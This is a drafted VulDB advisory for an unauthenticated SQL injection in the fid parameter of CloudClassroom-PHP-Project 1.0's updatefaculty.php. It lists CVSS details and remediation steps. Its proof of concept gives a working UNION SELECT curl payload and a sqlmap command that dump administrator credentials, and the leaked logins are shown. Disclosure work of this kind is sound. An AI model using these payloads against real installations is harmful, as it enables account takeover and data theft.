# VulDB Submission — CloudClassroom-PHP-Project 1.0 — SQL Injection in updatefaculty.php (fid parameter)

> Template for submission at https://vuldb.com/?submit — fill in the corresponding fields in the web form.

**Title:** CloudClassroom-PHP-Project 1.0 updatefaculty.php fid SQL Injection

| VulDB Field | Value |
|-------------|-------|
| Product | CloudClassroom-PHP-Project |
| Version | 1.0 |
| Vendor | Vishal Mathur |
| Vulnerability class | SQL Injection (UNION-based / error-based) |
| Affected component | updatefaculty.php (Component) |
| Affected parameter/argument | fid |
| Attack vector | Remote (Network) |
| Authentication | None (via Broken Access Control — item 00; original design requires admin session) |
| CWE | CWE-89 |
| CVSS 3.1 Base | 9.1 |
| CVSS 3.1 Vector | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |
| Exploit availability | Public (PoC included) |
| Countermeasure | Use prepared statements with parameter binding (`mysqli`/PDO) across 100% of queries. |

## Description

A vulnerability was found in CloudClassroom-PHP-Project 1.0. It has been classified as **Critical**.
This issue affects the component `updatefaculty.php` via the argument `fid`.
The numeric parameter `fid` is interpolated without quotes into the `SELECT` query. Within a numeric context, exploitation via `UNION SELECT` is possible. The queried table exposes 9 columns. Confirmed via unauthenticated dumping of administrator credentials.

The manipulation leads to SQL injection. The attack may be initiated remotely.

## Technical Details / Proof of Concept

```bash
curl -s -G "[http://127.0.0.1:9292/updatefaculty.php](http://127.0.0.1:9292/updatefaculty.php)" \
  --data-urlencode "fid=0 UNION SELECT 1,concat(0x5b,Aid,0x3a,Apass,0x5d),3,4,5,6,7,8,9 FROM admin -- -" | grep -oE "\[[^]]*:[^]]*\]"

sqlmap -u "[http://127.0.0.1:9292/updatefaculty.php?fid=1](http://127.0.0.1:9292/updatefaculty.php?fid=1)" -p fid --batch --dump -T admin

```

Observed evidence:

```
[admin@ics.com:admin]
[vishu:vishu]

```

## Countermeasure

* Use prepared statements with parameter binding (`mysqli`/PDO) across 100% of queries.
* Explicitly cast numeric identifiers (`(int)$id`) and use allowlists where applicable.
* Do not output `$sql` or `mysqli_error()` to the client (remove error-based feedback oracles).
* Enforce an `exit;` statement immediately after session authentication guards (see item 00).

## Timeline

* 2026-08-02: Vulnerability discovered and confirmed (local lab).
* 2026-08-02: Advisory prepared / VulDB submission drafted.

## Credits

Researcher: oliveira.luanalmeida@gmail.com and ethical.hacker.tiagoredivo@gmail.com

```
